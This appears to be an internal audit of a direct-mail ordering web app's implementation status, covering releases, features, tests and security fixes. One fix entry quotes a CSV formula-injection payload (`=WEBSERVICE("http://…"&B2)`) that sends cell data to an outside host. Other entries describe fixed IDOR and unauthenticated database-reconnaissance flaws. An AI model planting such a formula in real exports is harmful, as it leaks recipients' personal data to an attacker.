# YLS Implementation Status — Codebase-vs-Docs Audit

**Date:** 2026-08-02 (release update; base audit 2026-07-31) · **Branch:**
`main` — see §0 · **Method:** evidence-gated code verification (3 parallel audit
agents: full codebase inventory, planned-feature extraction from the April-2025
dev-docs, factual-claim extraction from the technical docs), reconciled against
the two prior audits (`docs/temp/yls-feature-audit-report.md` 2026-06-12,
`docs/temp/reports/feature-completeness-report-2026-06-14.md`) with every
previously-open gap re-verified directly in code this session.

**This file is the authoritative "what is actually built" document.** Every
other file in `dev-docs/` is an April/August-2025 planning baseline and carries
a staleness banner pointing here. Ground truth = code, never doc checkboxes.

---

## 0. Production release status (2026-08-02)

**The vendor fulfillment loop is LIVE.** `develop` merged to `main` (`1cbc0ee`)
and deployed to `app.yellowlettershop.com`. Before that merge, the three pending
migrations were applied to the hosted Supabase project (`lmtpfgfulkynrktdkgpu`):
`20260801000000_orders_refund_columns`, `20260801010000_order_dispatches`,
`20260801020000_dispatch_uniqueness_and_payment_status`.

Prior to this release `main` sat at `b6122cb` (2026-07-19) and contained **no**
`lib/fulfillment/` at all — so everything in §3 "Vendor fulfillment", the
inline-payment refactor, the money-moment confirmations and the PR #24 security
fixes reached customers for the first time here. One practical consequence: the
two vulnerabilities listed in §3b were never exposed in production, because the
code containing them had never shipped.

**Deployment identity (do not re-derive):** exactly one Vercel project serves
this app — `yellowlettershop` / `prj_snSyPlSbgjz6sd6hql7JTdfm9mt2` under team
`team_9aYvnhHwLiazNz7OoE8BsRVC` (slug `robs-projects-c72886ba`), which owns
`app.yellowlettershop.com` and matches `.vercel/project.json`. Two decoy
projects (a domain-less `yls`, and a second `yellowlettershop` on a separate
account) were deleted 2026-08-02 after they published the *same*
`Vercel – yellowlettershop` GitHub status context and overwrote each other,
making the check flip green/red for identical code. Commit statuses at or
before `dca90eb` still show a frozen `Vercel – yls: failure` — immutable
history, not a live signal.

`main` tracks production and lags `develop` by design (`develop` → `main` only
for releases), so a stale live site is expected between releases, not a fault.

### 0b. Production verification (2026-08-03)

Read-only smoke against `https://app.yellowlettershop.com` and the hosted DB.
**Everything checked is green.**

| Check | Result |
|---|---|
| Public pages `/`, `/login`, `/signup` | 200 |
| `orders` payment columns | `amount_authorized, amount_captured, amount_refunded, captured_at, refunded_at` all present |
| `order_dispatches` | exists, 14 columns, **RLS enabled** (no policy = service-role only, by design) |
| `uq_order_dispatches_live` | present, correctly `WHERE (status <> 'failed')` |
| `orders_payment_status_check` | accepts `pending/authorized/captured/failed/refunded/canceled` |
| `order_status` enum | includes `cancelled` |
| `dispatch_status` enum | `sent → accepted → in_production → shipped → delivered → failed` |
| Anonymous `GET /api/vendors`, `/api/orders`, `/api/admin/orders`, `/api/access-control/activity` | **401** |
| Anonymous `PATCH /api/admin/orders/…/dispatch` | **401** |
| Archived debug endpoints | **404** (were 200 before this release) |

**The money path itself has NOT been smoked against production.** It is blocked
on two things, neither of which an agent should decide alone:

1. **No production credentials** — a real order needs an interactive login.
2. **Unknown Stripe mode.** The publishable key is only inlined into
   authenticated-page bundles, so live-vs-test could not be determined from
   outside. If production runs live keys, a smoke order charges a real card.

Blast radius if one is run: **`vendors` is empty in production (0 rows, 0
active)**, so auto-dispatch would fail with "No active print vendor configured"
— which the design already treats as non-fatal — meaning **no physical mail
would be sent**. The residual risk is therefore the card charge alone. Note
production already holds 2 orders and 2 user profiles from prior use.

---

## 1. Superseded decisions (read first)

These overrule anything else in `dev-docs/` (detail:
`ylsbrain/knowledge/superseded.md`):

| Docs say | Reality |
|---|---|
| Subscription tiers (Free/Pro/Team/Enterprise, MRR) | **Transactional revenue only.** No subscriptions; MLM is a separate app. `lib/payments/subscription-service.ts` is dead code pending archive |
| Fancy Product Designer (FPD) | **Custom in-house designer** (`components/designer/`, 69 modules; zero FPD refs) |
| 8-tier / 4-role model | Code is `admin \| super_admin` + per-team roles (Owner/Admin/Member via `team_members`) |
| AccuZip $0.05/record billing | Tiered per-job pricing $8–$400, free with mail orders (seeded in `20260328000003`) |
| Prisma ORM, NextAuth.js | Neither is used. Supabase JS client + Supabase Auth (JWT/cookie) throughout |
| Jest + Cypress | **Mocha + RTL** (`npm test`); a leftover jest config exists but is unwired |
| Repo `yellow-letter-shop`, main-only branching | Repo folder `yls`, `develop` branch workflow; `package.json` name is still `my-v0-project` (scaffold leftover) |
| MelissaData vs AccuZip provider confusion | AccuZip = validation + count/search; Melissa = list-build data source (client exists, purchase flow not built) |

## 2. Verification gates (2026-08-02, run on the merged `main` tree)

| Gate | Result |
|---|---|
| `npm test` (Mocha) | **269 passing, 0 failing** (199 at the 2026-07-31 audit) |
| `npm run typecheck:full` | **0 errors** |
| `npm run build` | **exit 0** |
| CI unit tests | green on **both** ubuntu-latest and windows-latest |
| `npm run lint` | ~743 pre-existing errors repo-wide — known debt, own backlog ticket (`memory:project_lint_debt_cleanup`); delta-gate model in use |

These were re-run on the post-merge `main` tree rather than carried over from
`develop`, so they describe what is actually deployed.

Scale (re-counted 2026-08-02): 34 page routes · 113 API route files ·
484 component files · 119 lib modules · 42 hooks · **37 migrations** ·
**48 public tables** in the hosted project · 31 functions/RPCs with 84 RLS
policies · **38 Mocha test files** + 9 SQL assertion tests
(`supabase/tests/`).

---

## 3. BUILT — verified working (entrypoint + non-stub logic + wired end-to-end)

### Customer money path (end-to-end since 2026-06-13, hardened since)
Signup → build/upload list → validate (real AccuZip on the order path) →
design → authorize (Stripe manual capture) → real PDF proof (private bucket,
signed URL) → approve → capture → confirmation email → live status timeline.

- Order wizard + drafts (30-day) — `app/orders/new/`, `components/orders/` (17 step files), `app/api/orders/drafts/`
- Proof generation (pdf-lib) + approval→capture / reject→cancel — `app/api/orders/proof/`, `app/api/orders/[orderId]/approve/`
- Success + status pages — `app/orders/[orderId]/`, `success/`
- Payments lifecycle: intent/authorize/capture/refund/methods + idempotent Stripe webhook (sig verify, IP allowlist, `webhook_events` dedupe) — `app/api/payments/*`
- Server-side payment re-verification on submit; price from deliverable count — `lib/orders/verify-payment.ts`, `app/api/orders/submit/`
- Real user orders dashboard + real home-dashboard KPIs — `app/dashboard/orders/`, `app/dashboard/page.tsx`
- DB-config-driven pricing engine — `lib/orders/pricing*.ts`, admin pricing CRUD UI

### Designer suite (custom, no FPD)
- WYSIWYG canvas: 69 modules — canvas/snap/alignment, inspector (fields/panels/sections incl. table/QR/image-crop), layers/pages/background, merge-token engine + recipient mapping, design-system `ui/`
- Server-side PDF preview/proof renderer (pdf-lib + fontkit, bleed-aware, crop marks) — `app/api/design/preview/_render/`
- Print-accurate mail sizes, bleed/safe/USPS overlays, preflight rules engine — `mail-spec.ts`, `preflight/`
- **Postage areas** (2026-06-17): Stamp/Indicia modules, singleton gating, keep-clear enforcement, guarded delete — `components/designer/postage.ts`
- **3D mail-piece preview** (2026-07, three.js/R3F): paper stocks, ink engine, page curl, art-driven textures, cursor zoom, drag-to-look/grab-to-flip — `components/design-preview-3d/` (20 modules), wired into `preview-modal.tsx`
- Element **rotation + opacity** honored across editor, PDF render, and 3D capture (2026-07-30 fix)
- Design save/load (`saved_designs`), fonts API (DB + fallback), asset library CRUD + share links + storage fallback, recipient-data preview vs real rows

### Teams / access control (rebuilt 2026-06-15→16, browser-E2E'd)
- Teams, membership, invitations: tables + SECURITY DEFINER RPCs + RLS in migrations (`20260616000000`–`000600`) — invite (Resend email), accept, roles (Owner/Admin/Member), transfer, delete, seat cap
- Access-control layer: access requests, permission templates (+ **name-based resource picker** with All-\[type\] wildcard grants, e2e-passed 2026-06-16), time-based permissions, team activity log — `app/api/access-control/*`, `components/access-control/`
- 9 SQL assertion tests in `supabase/tests/` (authority matrix, RLS, grants)

### Auth / security
- Email + Google OAuth, signup w/ auto-profile creation, verify, forgot/reset, working sign-out
- `withAuth` (Bearer **and** cookie session), `withAdmin` (`admin|super_admin`)
- **Real TOTP 2FA** (Supabase MFA enroll/verify), password change — `lib/auth/mfa.ts`
- **Real login history** (`get_my_sessions` RPC over `auth.sessions`) + "sign out all other sessions" — `app/dashboard/security/`
- PII RLS hardening, private proof bucket, secret-leak remediation + `sb_*` key migration (2026-06-14)

### Mailing lists / validation
- CSV/XLSX/ODS import → `mailing_list_records` (ExcelJS, 10MB cap), column mapping w/ required-field gate, dedup (real grouping/keep-strategy/version backup), version history + restore, audit log, manager UI (84 components)
- Real AccuZip on the order path (`/validate/batch`, loud 503 in prod without key) — `lib/api/accuzip/validation.ts`

### Browser-smoke verification (2026-07-31, full loop through the real UI)
Customer: login → wizard (manual entry → mapping → validation → contact card →
designer handoff → review with real generated proof) → **$1.18 authorized** on
a test Visa → submit → success page → status page → approve → **capture** →
**auto-dispatch fired**. Admin: order detail shows captured payment + dispatch
panel → accepted → in production → **mailed with tracking** → delivered →
order `completed`; customer page shows tracking. Four bugs found and fixed in
the same pass, the critical one being **order pricing 10× under** (cents
divided by 1000 — Stripe rejected small orders as `amount_too_small` and every
real order would have undercharged 10×).

### Card entry (2026-07-31)
`POST /api/payments/setup-intent` + `AddPaymentMethodDialog` (Stripe Payment
Element) let a **first-time customer save a card** — previously impossible
(the add-card button opened a route that did not exist, so only customers with
a pre-attached Stripe method could pay). Saved `off_session` so the card is
reusable for drip touches (D7) and re-authorization before vendor-gated
capture (D9). Backend verified end-to-end for a brand-new customer incl. the
declined-card path; the Element's visual mount is not browser-verified (local
CDP failure — see §7).

### Vendor fulfillment (2026-07-31, shipped to production 2026-08-02)
- **Dispatch loop**: proof approval → capture → **auto-dispatch to a print
  vendor** → vendor emailed the approved proof + recipient CSV (7-day signed
  links, private bucket) → admin advances accepted → in production → mailed
  (with tracking) → delivered → order reaches `completed`, customer emailed on
  ship. `lib/fulfillment/` (8 modules: pure `dispatch-core` + IO
  `dispatch-service`, `dispatch-recipients`, `dispatch-status`, plus the
  Redstone trio), `order_dispatches` table (`20260801010000`), admin API
  `app/api/admin/orders/[orderId]/dispatch/`, panel
  `components/admin/orders/order-dispatch-panel.tsx`
- **Inline-payment model completed**: `payment_transactions` (which no
  migration ever created) removed from all 6 referencing files; revenue,
  capture, refund, and LTV now read/write `orders` directly. Migration
  `20260801000000` added `captured_at`/`amount_refunded`/`refunded_at` + the
  missing `cancelled` status
- **Vendor directory** (`lib/vendors/vendor-directory.ts`) targeting the real
  `vendors` schema; `/api/vendors` is now authenticated (was open CRUD).
  Per owner decision the **entire vendor API surface is admin-only** — vendor
  contact info and wholesale pricing are operational data no customer needs
- **Concurrency**: one live dispatch per order enforced by the DB
  (`uq_order_dispatches_live`, partial unique index where `status <> 'failed'`);
  `updateDispatchStatus` does a compare-and-swap on the status it read, so two
  concurrent admin PATCHes cannot both send the customer a "shipped" email

### Money-moment confirmations (2026-08-01)
Both points where money moves now sit behind an explicit confirmation with the
amount as the visual hero — `components/orders/confirm-action-dialog.tsx`,
used by `PaymentStep` (authorize the hold) and `app/orders/[orderId]/page.tsx`
(approve → capture, styled `commit`; reject → release). Previously capture had
**no** confirmation at all and reject used a bare `window.confirm` — backwards
relative to the risk. The review step's approval was also collapsed from four
checkboxes the UI demanded but the gate did not enforce, down to two that are
genuinely enforced by `validateCurrentStep` (`types/orders.ts:OrderApproval`).

### 3b. Security + money fixes from the PR #24 ultrareview (2026-08-02)
Eight review findings, each re-verified against the code before acting, plus a
ninth found while fixing them. None had ever reached production (see §0).

| Fix | What it was |
|---|---|
| **Cross-tenant PII (IDOR)** | `loadRecipients` read `mailing_list_records` by a customer-supplied `selectedListId` using the **service role** (RLS bypassed) with no ownership check, and `/api/orders/submit` accepts `orderState` as `z.record(z.unknown())` stored verbatim — so knowing another tenant's list UUID was enough to have their PII exported to our print vendor. Gate ported from `app/api/accuzip/upload/route.ts` into `lib/fulfillment/dispatch-recipients.ts`, keyed on the **order owner**, never the actor |
| **CSV formula injection (CWE-1236)** | `csvCell` escaped only `",\n\r`, so `=WEBSERVICE("http://…"&B2)` in a recipient name reached the vendor's Excel and executed. `neutralizeSpreadsheetFormula` in `dispatch-core.ts`, applied in both CSV builders — in `sanitizeRedstoneCell` it must run **last**, or the existing `["',]` strip eats the guard apostrophe |
| **Refund accounting** | `amount_refunded` was overwritten with the current refund instead of accumulated, though the column is declared cumulative — so a second partial refund erased the first and admin revenue (captured − refunded) over-reported. Pure `lib/payments/refund-core.ts` + 6 tests |
| **Partial refund mislabelling** | Any refund set `payment_status='refunded'`, and `refundOrder` set the order to `cancelled` — so a $1 goodwill refund on a $100 order read as fully refunded **and cancelled an order that still mails**. Both now gated on `isFullRefund` |
| Dispatch race → 500 | The 23505 loser threw a message the route's guard regex did not match, returning 500 instead of 409 |
| `order_dispatches.package` overwrite | The Redstone leg replaced the jsonb wholesale (PostgREST does not merge), dropping the `csvPath`/`proofPath` written at insert |
| File size | `dispatch-service.ts` was 426 lines against the ≤350 rule; split into `dispatch-recipients` + `dispatch-status` (now 264) |

### Platform services
- Outbound transactional email: Resend-preferred/Mailgun-fallback adapter, XSS-escaped templates, wired into submit / proof-ready / captured / team-invite — `lib/email/`
- Durable DB-backed job queue (`background_jobs`), outbound webhooks w/ HMAC + retry/backoff + dead-letter, bulk operations, tags (hierarchy/categories/bulk), contact cards, profile, vendors CRUD + performance + communications log, enhanced campaigns (create/execute/split), version-history undo/redo, short-link tracking + engagement events + admin analytics dashboard
- Admin suite: users CRUD/credits/notes/password-reset, pricing CRUD + change log, orders list/detail UI (`app/dashboard/admin/orders/`), health checks, settings
- Local Docker Supabase dev stack + replayable migration baseline; prod migration runner + CI workflow; prod DB reconciled 2026-06-17 (6 missing migrations applied)

---

## 4. PARTIAL — exists but degraded, mock, or unwired

> **Re-audited 2026-08-03 against the code, not carried forward.** Every row
> below was re-checked at its cited path this session; all still hold. Rows 1–3
> remain cleared. Nothing in the 2026-08-02 release touched any of these, which
> the audit confirms rather than assumes.

| # | Feature | Gap | Evidence |
|---|---|---|---|
| ~~1~~ | ~~Admin revenue / capture-refund persistence / LTV~~ | **FIXED 2026-07-31** — refactored to the inline-on-orders model | `lib/admin/analytics-core.ts` |
| ~~2~~ | ~~Admin order service drift~~ | **FIXED 2026-07-31** — `created_by` + batch profile load | `lib/admin/order-service.ts` |
| ~~3~~ | ~~Vendor fulfillment~~ | **BUILT 2026-07-31** — see §3 Vendor fulfillment | `lib/fulfillment/` |
| 4 | Template galleries (both) | `app/templates/` reads static `data/templates-data.ts`; `app/dashboard/templates/` is hardcoded mocks; `mail_templates` route targets a table no migration creates | `app/dashboard/templates/page.tsx:27`, `app/api/templates/[templateId]/` |
| 5 | List-builder estimate | Silent client-side mock fallback ($0.12/rec) without `MELISSA_DATA_API_KEY`; `lib/api/accuzip/count.ts` returns `Math.random()` counts without key | `hooks/use-list-estimate.ts:29,133-140` |
| 6 | Secondary address validation | `/api/validation/address` engine still **simulates CASS** (canned zip4/county); order path is real, this one isn't | `lib/validation/address-validation.ts:127-128,330` |
| 7 | Skip tracing | Inbound webhook is a no-op (`TODO` line 89); no selection UI/export/vendor dispatch despite `skip_trace_orders` table | `app/api/skip-trace/webhook/results/route.ts:89` |
| 8 | Campaign recurring/drip (D7) | Scheduler is a `console.log` stub; record processing has no vendor integration | `lib/campaigns/enhanced-campaign-service.ts:441,550` |
| 9 | Drafts autosave | Interval only runs after `orderId` exists → dormant until first manual save | `components/orders/OrderProvider.tsx:48-55` |
| 10 | Rate limiting | DB-backed limiter (`lib/rate-limit/`, `rate_limit_counters` + RPC) has **zero callers**; in-memory Map still the live path | `lib/auth/middleware.ts:198` |
| 11 | Proof annotations | `proof_annotations` table exists; **zero code references** — no viewer/annotation UI (PRD §3.10) | migrations vs grep |
| 12 | Activity page | Mock data | `app/dashboard/activity/page.tsx:27` |
| 13 | In-app notifications | Toasts (sonner) only; no notification center/preferences (mock settings page was removed rather than backed) | `components/ui/toaster.tsx` |
| 14 | Melissa list purchase | Client exists, estimate wired; **no purchase/payment flow**; wizard says "List Builder integration coming soon" | `components/orders/steps/ListDataStep.tsx:312,593` |
| 15 | Undo/redo | Implemented for one resource type only (TODOs) | `lib/version-history/undo-redo.ts:90-115` |
| 16 | Subscription code (dead by design) | `lib/payments/subscription-service.ts` + `SubscriptionPlanCard` still present; `app/api/subscriptions/` + RBAC already archived | pending archive per transactional model |

## 5. NOT BUILT — planned in docs, zero meaningful code

> **Re-audited 2026-08-03.** Spot-checked by grep across `app/`, `lib/`,
> `components/`: no AI SDK/provider wiring, no `@sentry`, no report-builder
> routes, no GDPR export/deletion, no discount/referral codes, no API-key
> management. Admin impersonation remains **type-only** (`lib/admin/types.ts`
> and nothing else). All rows below still hold.

- Proof **annotation** workflow (PDF.js viewer, threaded comments, x/y pins) — PRD §3.10
- **Inbound** vendor file/email processing (vendor replies are recorded by an
  admin today; outbound dispatch IS built — see §3) — PRD §3.8
- Admin impersonation (type-only) — PRD §3.15
- Report builder / saved / scheduled reports — PRD §3.14
- NPS / feedback system, support ticketing — PRD §3.16
- AI features: content generation, contextual help (zero AI wiring in app) — PRD §3.11
- Mail tracking / delivery confirmation add-on — PRD §3.5
- Onboarding/guided first-run, address autocomplete, discount/referral codes
- ~~Redstone API~~ — **outbound path now BUILT** (see §8b); blocked on Redstone
  provisioning our endpoint, not on our code
- Public API keys / external REST API management, Zapier
- One-off single-recipient mail flow, reorder-with-edit flow
- GDPR export/deletion tooling, Sentry (or any error-monitoring service)

## 6. Differentiators D1–D10 (owner-approved 2026-06-12/13)

| D# | Feature | Status 2026-07-31 |
|---|---|---|
| D1 | Per-recipient QR / pURLs | PARTIAL — QR renderer + short-link backend; no per-recipient generation flow |
| D2 | AI copy assistant | NOT BUILT (zero AI wiring) |
| D3 | A/B split sending | PARTIAL — split/scheduling layer BUILT; **winner declaration confirmed absent 2026-08-03** (no `declareWinner` or equivalent anywhere in `lib/campaigns/`). Previously logged as "unverified"; now verified |
| D4 | Template marketplace + stats | PARTIAL — galleries still static/mock |
| D5 | Win-back emails | NOT BUILT |
| D6 | CallRail integration | NOT BUILT (decision recorded; needs owner OAuth creds — `memory:project_callrail_integration`) |
| D7 | Drip sequences | PARTIAL — config/schema present, scheduler stub |
| D8 | Deliverability score | PARTIAL — designer preflight half BUILT; checkout combined score not built |
| D9 | Vendor-gated capture | PARTIAL — capture still fires on customer approval, not vendor confirmation |
| D10 | AI proof comparison | NOT BUILT |

## 7. Known risks / hygiene (from the 2026-07-31 inventory)

- **Security review candidates** (re-verified 2026-08-03): `middleware.ts` matcher covers only `/dashboard/:path*` — `/orders/*`, `/design/customize`, `/mailing-services/*` rely on client-side guards + per-route `withAuth`; `analytics/performance` trusts a `userId` query param (IDOR); bare (unwrapped) API handlers remain at `payments/create-payment-intent`, all `mailing-lists/*`, `/api/teams/*` (the bare `capture-payment` / `refund-payment` routes were **archived** to `archive/api-payments-2026-08/` and are no longer live).
- ~~**Shipped test/debug endpoints**~~ **RESOLVED 2026-08-03.** `api/test-db`, `api/test-db-verification`, `api/test-auth-state` and `/test-types` were confirmed live on the public domain after the 2026-08-02 release and are now archived to `archive/debug-endpoints-2026-08/`. The material one was `test-db-verification`: a bare unauthenticated `GET` that built a **service-role** Supabase client (RLS bypassed, plus a hard-coded public demo-key fallback so it could not fail closed) and answered anonymous callers with table-existence, schema-version and function-count reconnaissance. `test-auth-state` was already correctly `NODE_ENV`-gated (403 in prod). See that folder's README for the evidence and safe-restore guidance.
- **Dispatch auth-gate tripwire (new 2026-08-02):** the §3b ownership check requires `mailing_lists.created_by === orders.created_by` **or** a shared `team_id`. A team-shared list whose `team_id` is NULL will now be refused with "refusing to dispatch" where it previously dispatched. This is the same rule `app/api/accuzip/upload/route.ts` already enforces, so any list that validates can dispatch — but a NULL `team_id` is the first thing to check if a real dispatch starts failing.
- **Parallel/duplicate systems to consolidate or delete:** `/api/team/*` vs `/api/teams/*`; `components/team/` vs `teams/`; `components/tags/` vs `tag-management/`; `lib/payments/payment-service.ts` vs `payment-service-new.ts`; `payments/intent` vs `create-payment-intent`; two advanced-search generations; `hooks/filters/useMailingListManager.ts` vs `use-mailing-list-manager/`; `/signup` vs `/register`; orphan `app/dashboard/users/loading.tsx`.
- **Test coverage gaps:** designer + orders libs well covered; zero tests for list builder, media/assets, payments, admin services, campaigns, vendors, API routes, component rendering.
- `@playwright/mcp` sits in prod `dependencies`; `@types/react` v19 vs React 18; unused jest stack.
- ~743 pre-existing ESLint errors (agreed cleanup backlog, separate ticket).

## 8. In-flight (not on develop)

Full frontend redesign ("Masthead" direction, chosen 2026-07-10 per
`docs/temp/NEW_UI_DIRECTION_CHOICE.md` + `NEW_UI_DESIGN_SPEC.md`) — exploratory
branches (`new-ui-*`, `marketing-s2`, `dashboard-s2`, `yls-ui-002`); nothing
merged. The earlier light-dark-theme redesign was completed then scrapped by
the owner (archived at tag `archive/light-dark-theme-5978f79`).

## 8b. Redstone Mail API — live-verified findings (2026-08-01)

**`dev-docs/api-redstone.md` was fabricated and is gone** — archived 2026-08-02
to `archive/api-redstone-fabricated-2026-08/`, whose README carries the
falsehood-by-falsehood comparison. The real spec is
`docs/temp/vendors/redstone/rsm_api_specs_pre-r631-1.pdf`.

Verified by probing the live API with the real `REDSTONE_API_KEY`:

| Finding | Evidence |
|---|---|
| Real endpoint is `POST https://redstonemail.com/apis/createOrder?API=<key>` | `api.`/`test-api.redstonemail.com` present no valid TLS cert |
| The key authenticated at first | No key and a bogus UUID both return `{"fail":true,"msg":"Where did you come from?"}`; the real key got past that gate into the handler |
| **HTTP 200 does not mean success** | Failures arrive as `200` + `{"fail":true,...}` |
| Malformed/unaccepted payloads return an **HTML 500**, not the spec's `422` JSON | The PDF is labelled *pre-*r631-1; the deployed build predates that response-code table |
| **`createOrder` returned HTML 500 for every well-formed payload** — flat, `{"Order":{…}}`-wrapped, with `seeds`, and form-encoded | 4 shapes, identical opaque failure |
| After ~8 posts, **all three endpoints began rejecting the valid key** with "Where did you come from?" | Almost certainly a rate/abuse guard. Probing stopped. |

**Most likely explanation (inference, not confirmed):** the spec says in §4.1/§4.2
that Redstone *generates the endpoint per customer after reviewing your data*.
Our account appears not to be provisioned yet — the key authenticates but there
is no intake configured behind it. **If that is right, outbound `createOrder`
cannot be completed unilaterally either**, and contacting Redstone is the
critical path for both directions, not just for webhooks.

Built anyway and ready to switch on (`feature/vendor-fulfillment`):
`lib/fulfillment/redstone-core.ts` (pure mapping + response classification, 25
tests), `redstone-client.ts` (retries only throttling/network, never a rejected
payload), `redstone-dispatch.ts` (dispatch leg). A vendor opts in via
`contact_info.integration = "redstone"`; everything else keeps the email
hand-off, which remains the working fallback. `REDSTONE_API_TEST` defaults to
test mode and only the literal string `false` disables it.

Open questions for Redstone: is our endpoint provisioned; does the payload need
an `{"Order": …}` wrapper; is a Supabase signed URL's `?token=` acceptable under
their "no credentials in URL" rule; and what webhook authentication do they want
(their spec defines none).

## 9. Doc map — status of every dev-doc

| File | Verdict |
|---|---|
| `implementation-status.md` | **Authoritative** (this file) |
| `PRD.md`, `roadmap.md`, `todo.md`, `features-and-dashboards.md` | Historical April-2025 plan — useful for feature *intent*; checkboxes/statuses unreliable; superseded on FPD/subscriptions/roles/billing |
| `technical-architecture.md`, `development-guide.md`, `developer-quick-start-guide.md` | Stale on stack (FPD, Prisma, NextAuth, Jest/Cypress, Next 14, repo name, scripts); structure/intent partially valid |
| `api-accuzip.md`, `api-melissa.md`, `api-integrations.md`, `external-api-mapping.md` | Vendor/API reference — field mappings still useful; implementation-status columns stale (e.g. external-api-mapping calls Stripe "planned") |
| ~~`api-redstone.md`~~ | **FABRICATED. Archived 2026-08-02** → `archive/api-redstone-fabricated-2026-08/`. Real spec: `docs/temp/vendors/redstone/rsm_api_specs_pre-r631-1.pdf`. See §8b |
| `cross-reference-mapping-with-code.md` | AI-generated cookbook, truncated mid-document; treat all "existing paths" claims as aspirational |
| `urls.txt` | Reference list |

Live reconciled knowledge (kept current by the ylsbrain protocol):
`ylsbrain/knowledge/{features,roadmap,superseded,orientation}.md`.
